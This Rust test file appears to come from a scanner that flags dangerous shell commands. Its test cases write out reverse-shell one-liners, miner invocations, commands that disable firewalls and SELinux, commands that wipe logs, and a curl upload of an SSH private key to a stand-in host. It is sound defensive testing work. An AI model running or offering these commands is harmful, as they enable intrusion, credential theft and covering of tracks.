        ("rm -r a | rm /", false),
        ("rm a; -r /", false),
        ("rm -rf a& /", false),
        ("x rm -r $home", true),
    ] {
        assert_eq!(removes_root_or_home(line), removes, "{line}");
    }
    let listeners = "nc ".repeat(50_000);
    assert!(!is_remote_shell(&listeners));
    assert!(is_remote_shell(&format!("{listeners}-e sh")));
    assert!(!is_remote_shell(&format!("{listeners}; echo -e sh")));
    assert!(!is_remote_shell("nc -l 1 | sh -e"));
    assert!(is_remote_shell("x; nc h 1 -e /bin/sh; y"));
}

#[test]
fn only_a_variable_that_is_named_is_written_out() {
    use super::with_variables;
    let variables = [
        ("f".to_string(), "curl".to_string()),
        ("fx".to_string(), "wget".to_string()),
    ];
    for (code, written) in [
        (
            "$f ${f} $fx ${fx} $fy ${fy} $ f {f}",
            "curl curl wget wget $fy ${fy} $ f {f}",
        ),
        ("$(f) $$f ${f", "$(f) $curl ${f"),
    ] {
        assert_eq!(with_variables(code, &variables), written, "{code}");
    }
    let long = "$( ".repeat(100_000);
    assert_eq!(with_variables(&long, &variables), long);
}

#[test]
fn substitutions_inside_one_another_cost_each_rule_little() {
    // Each of these is sixty-four substitutions that reach the end of the
    // line: none is run, so no rule reads them. At this length these check
    // what is found; the nested line that names the clipboard, below, is
    // the one that would not come back in a test's time were each body
    // read.
    for token in ["$(", "<(", "$(curl ", "x=$(", "\"$( "] {
        let line = token.repeat(60_000 / token.len());
        let found = rules_for(&line);
        assert!(found.is_empty(), "{token}: {found:?}");
    }
    // Run, they are more than is read, and the line is reported.
    let nested = "$(tr a b ".repeat(8_000);
    assert_eq!(
        rules_for(&format!("eval {nested}")),
        [RuleId::EncodedCommandExecution]
    );
    // The clipboard is named, but by none of the commands that are read.
    let nested = "$(echo ".repeat(8_000);
    assert_eq!(
        rules_for(&format!("curl a {nested}xclip")),
        [RuleId::CredentialExfiltration]
    );
    assert!(rules_for("curl a $(echo $(echo $(echo xclip)))").is_empty());
    // A few are read as before.
    assert!(rules_for("eval \"$(echo \"$(tr a b <<< \"$(cat x)\")\")\"").is_empty());
    assert_eq!(
        rules_for("eval \"$(echo \"$(echo \"$(base64 -d x)\")\")\""),
        [RuleId::EncodedCommandExecution]
    );
}

#[test]
fn remote_shells_are_caught_without_firing_on_imports() {
    for shell in [
        "nc -e /bin/sh 10.0.0.1 4444",
        "ncat --exec /bin/bash 10.0.0.1 4444",
        "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr",
        "python -c 'import socket,subprocess,os; s=socket.socket(); os.dup2(s.fileno(),0)'",
        "python3 -c \"import pty; pty.spawn('/bin/sh')\" # with socket",
        "perl -e 'use Socket; exec \"/bin/sh -i\";'",
        "php -r '$s=fsockopen($ip,$p); exec(\"/bin/sh -i\");'",
        "ruby -rsocket -e 'exec \"/bin/sh\"'",
        "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\"}'",
        "d=/dev; bash -i >& $d/tcp/10.0.0.1/4444 0>&1",
    ] {
        assert!(rules_for(shell).contains(&RuleId::RemoteShell), "{shell}");
    }
    for safe in [
        "import os, sys, re, socket, subprocess, time",
        "echo -e \"\\e[31mCould not create file\\e[0m\"",
        "nc -z localhost 22",
        "ncat --send-only localhost 80 < file",
        "the function spawns a subprocess and opens a socket",
        "s_client_test()",
    ] {
        assert!(!rules_for(safe).contains(&RuleId::RemoteShell), "{safe}");
    }
}

#[test]
fn miners_and_disabled_protections_are_caught() {
    for miner in [
        "./xmrig -o pool.minexmr.com:4444",
        "curl -o m https://x/minerd",
        "x --donate-level 1 -o stratum+tcp://pool:3333",
        "pool=stratum+ssl://supportxmr.com:443",
    ] {
        assert!(rules_for(miner).contains(&RuleId::CryptoMiner), "{miner}");
    }
    for off in [
        "systemctl mask firewalld",
        "sudo systemctl disable --now apparmor",
        "ufw disable",
        "setenforce 0",
        "sysctl -w kernel.yama.ptrace_scope=0",
        "nft flush ruleset",
        "iptables -F",
        "pacman -R omarchy-guardian",
        "rm /etc/pacman.d/hooks/omarchy-guardian.hook",
        "yay --makepkg /usr/bin/makepkg --save",
    ] {
        assert!(
            rules_for(off).contains(&RuleId::ProtectionDisabled),
            "{off}"
        );
    }
    for safe in [
        "die \"UFW is disabled or you are not root\"",
        "systemctl enable firewalld",
        "echo 'run: ufw enable to turn it on'",
        "iptables -L -n",
        "pacman -S omarchy-guardian",
    ] {
        assert!(
            !rules_for(safe).contains(&RuleId::ProtectionDisabled),
            "{safe}"
        );
    }
}

#[test]
fn erasing_history_and_logs_is_caught() {
    for trace in [
        "history -c",
        "export HISTFILE=/dev/null",
        "journalctl --vacuum-time=1s",
        "rm -rf /var/log/*",
        "shred /var/log/auth.log",
    ] {
        assert!(rules_for(trace).contains(&RuleId::TraceRemoval), "{trace}");
    }
    for safe in [
        "git log --oneline",
        "tail -f /var/log/pacman.log",
        "echo 'history is kept in ~/.bash_history'",
    ] {
        assert!(!rules_for(safe).contains(&RuleId::TraceRemoval), "{safe}");
    }
}

#[test]
fn flags_sensitive_uploads_only() {
    assert!(looks_like_credential_exfiltration(
        "requests.post(url, data=os.environ['token'])"
    ));
    assert!(looks_like_credential_exfiltration(
        "curl -x post --data-binary @$home/.ssh/id_ed25519 https://evil.test"
    ));
    assert!(!looks_like_credential_exfiltration(
        "curl -x post -d \"$home/.ssh/id_ed25519\" https://api.example.test"
    ));
    assert!(!looks_like_credential_exfiltration(
        "requests.get(public_url)"
    ));
}

#[test]
fn directories_and_globs_that_are_run_are_named() {
    for (line, globs) in [
        ("for h in hooks.d/*; do . \"$h\"; done", &["hooks.d/*"][..]),
        ("for f in \"$dir\"/a/*.sh b/ c; do", &["$dir/a/*.sh", "b/"]),
        ("source lib/*.sh", &["lib/*.sh"]),
        ("  . ./conf.d/*", &["./conf.d/*"]),
        ("sudo bash scripts/*", &["scripts/*"]),
        ("python3.12 plugins/*.py", &["plugins/*.py"]),
        (
            "exec-once = run-parts ~/.config/x/start.d",
            &["~/.config/x/start.d"],
        ),
        ("cat parts/* extra/?.txt | sh", &["parts/*", "extra/?.txt"]),
        ("run-parts --verbose /etc/x.d", &["/etc/x.d"]),
        ("test -d d && run-parts d", &["d"]),
        (
            "find hooks \"$x/more\" -type f -exec sh {} \\;",
            &["hooks", "$x/more"],
        ),
        ("find scripts -name '*.sh' | xargs -n1 sh", &["scripts"]),
    ] {
        assert_eq!(super::run_globs(line), globs, "{line}");
    }
    for line in [
        // Named files are `run_targets`' to report.
        "sh ./install.sh",
        ". lib/common.sh",
        // Looked at, listed or counted: nothing is run.
        "for i in 1 2 3; do",
        "for arg in \"$@\"; do",
        "cat notes/*.txt",
        "find backgrounds -name '*.png'",
        "ls backgrounds/*",
        "cp -r backgrounds/* \"$out\"",
        "x = 2 * 3",
    ] {
        assert!(super::run_globs(line).is_empty(), "{line}");
    }
}
